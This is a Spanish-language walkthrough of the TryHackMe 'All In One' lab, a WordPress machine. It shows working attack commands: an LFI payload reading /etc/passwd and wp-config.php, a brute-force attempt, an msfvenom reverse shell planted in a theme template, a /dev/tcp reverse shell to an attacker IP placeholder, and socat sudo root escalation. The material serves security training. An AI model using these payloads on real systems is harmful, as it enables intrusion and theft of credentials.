---
tags:
  - Cybersecurity
  - Labs
  - TryHackMe
  - Easy
  - HTTP
  - FuzzingWeb
  - CMS
  - WordPress
  - LFI
  - ReverseShell
  - PrivilegeEscalation
  - Sudo
---
- [[#Enumeración|Enumeración]]
	- [[#Enumeración#Ping|Ping]]
	- [[#Enumeración#Nmap|Nmap]]
	- [[#Enumeración#HTTP|HTTP]]
		- [[#HTTP#Fuzzing Web|Fuzzing Web]]
		- [[#HTTP#WPScan|WPScan]]
		- [[#HTTP#Searchsploit|Searchsploit]]
- [[#Explotación|Explotación]]
	- [[#Explotación#LFI|LFI]]
	- [[#Explotación#WordPress|WordPress]]
	- [[#Explotación#Reverse Shell|Reverse Shell]]
	- [[#Explotación#Escalada de Privilegios|Escalada de Privilegios]]
		- [[#Escalada de Privilegios#Sudo|Sudo]]


---
# All In One
![](Screenshots/Pasted%20image%2020251204125208.png)

> En este write-up se documenta la resolución paso a paso de la máquina **All In One** de [TryHackMe](https://tryhackme.com/room/allinonemj), clasificada como dificultad _Easy_. Se cubren las fases de **enumeración**, **explotación** y **escalada de privilegios**.

---
## Enumeración
### Ping

`ping -c 1 10.82.188.57`

![](Screenshots/Pasted%20image%2020251204090303.png)
### Nmap

`nmap -p- --open -sS --min-rate 5000 -sS -vvv -n -Pn 10.82.188.57 -oG allPorts`

![](Screenshots/Pasted%20image%2020251204090453.png)

`nmap -p21,22,80 -sCV 10.82.188.57 -oN targeted`

![](Screenshots/Pasted%20image%2020251204090512.png)
### HTTP

`http://10.82.188.57/`

![](Screenshots/Pasted%20image%2020251204091334.png)
#### Fuzzing Web

`gobuster dir -u http://10.82.188.57/ -w /usr/share/wordlists/dirbuster/directory-list-lowercase-2.3-medium.txt -x php,html,txt -t 64`

![](Screenshots/Pasted%20image%2020251204091842.png)

`http://10.82.188.57/wordpress/`

![](Screenshots/Pasted%20image%2020251204092041.png)
#### WPScan

`wpscan --url http://10.82.188.57/wordpress/ --enumerate u`

![](Screenshots/Pasted%20image%2020251204092144.png)
![](Screenshots/Pasted%20image%2020251204092203.png)

Se encuentra el usuario: `elyana`, se procede a realizar *fuerza bruta* para descubrir la contraseña.

`wpscan --url http://10.82.188.57/wordpress/ -U elyana -P /usr/share/wordlists/rockyou.txt`

![](Screenshots/Pasted%20image%2020251204092345.png)
![](Screenshots/Pasted%20image%2020251204092406.png)

No se encuentra ninguna contraseña.

Se observa 2 *plugins* instalados:
- `mail-masta`.
- `reflex-gallery`.
#### Searchsploit

`searchsploit "WordPress mail-masta"`

![](Screenshots/Pasted%20image%2020251204095050.png)

[WordPress Plugin Mail Masta 1.0 - Local File Inclusion](https://www.exploit-db.com/exploits/40290).

![](Screenshots/Pasted%20image%2020251204095140.png)

---
## Explotación
### LFI

`http://10.82.188.57/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=/etc/passwd`

![](Screenshots/Pasted%20image%2020251204095340.png)

`http://10.82.188.57/wordpress/wp-content/plugins/mail-masta/inc/campaign/count_of_send.php?pl=php://filter/convert.base64-encode/resource=../../../../../wp-config.php`

Este payload usa el wrapper `php://filter` de PHP para *leer y codificar* en **Base64** el contenido del archivo: `wp-config.php`.

Se procede a desencriptar.

`echo -n "[BASE64]" | base64 -d`

![](Screenshots/Pasted%20image%2020251204095827.png)

Se obtiene el usuario: `elyana` y la contraseña.
### WordPress

Se accede al panel de administración de *WordPress*.

`http://10.82.188.57/wordpress/wp-login.php`

![](Screenshots/Pasted%20image%2020251204095955.png)

![](Screenshots/Pasted%20image%2020251204100431.png)

Se accede a la siguiente ruta: `/Appearance/Theme Editor`.

![](Screenshots/Pasted%20image%2020251204100609.png)
### Reverse Shell

Se genera una *Reverse Shell*.

`msfvenom -p php/reverse_php LHOST=[IP_ATACANTE] LPORT=1234 -f raw > pwned.php`

Se copia el contenido de la *Reverse Shell* en `404 Template`.

Nos ponemos en escucha por el puerto `1234` y se accede a la siguiente ruta: `10.82.188.57/wordpress/wp-content/themes/twentytwenty/404.php`.

Se procede a realizar otra *Reverse Shell* para no poder la conexión, además de realizar el tratamiento de la terminal.

```bash
sh -i >& /dev/tcp/[IP_ATACANTE]/1235 0>&1
script /dev/null -c bash
Ctrl + Z
stty raw -echo; fg
reset xterm
export TERM=xterm
export SHELL=bash
```
### Escalada de Privilegios

Se accede al directorio `/home` del usuario `elyana`.

`cd /home/elyana`

`ls -l`

![](Screenshots/Pasted%20image%2020251204101753.png)

Con el usuario `www-data`, tenemos permisos para leer el archivo `hint.txt`.

`cat hint.txt`

![](Screenshots/Pasted%20image%2020251204101857.png)

`find / -user elyana 2>/dev/null`

![](Screenshots/Pasted%20image%2020251204102643.png)

`cat /etc/mysql/conf.d/private.txt`

![](Screenshots/Pasted%20image%2020251204102728.png)

`su elyana`

Ya tenemos acceso con el usuario `elyana`.
#### Sudo

`sudo -l`

![](Screenshots/Pasted%20image%2020251204103017.png)

Se realiza una búsqueda por [GTFOBins](https://gtfobins.github.io/gtfobins/socat/#sudo).

![](Screenshots/Pasted%20image%2020251204103100.png)

`sudo socat stdin exec:/bin/sh`

![](Screenshots/Pasted%20image%2020251204103122.png)

Existen varias maneras de escalar privilegios en esta máquina, este es uno de ellos.

---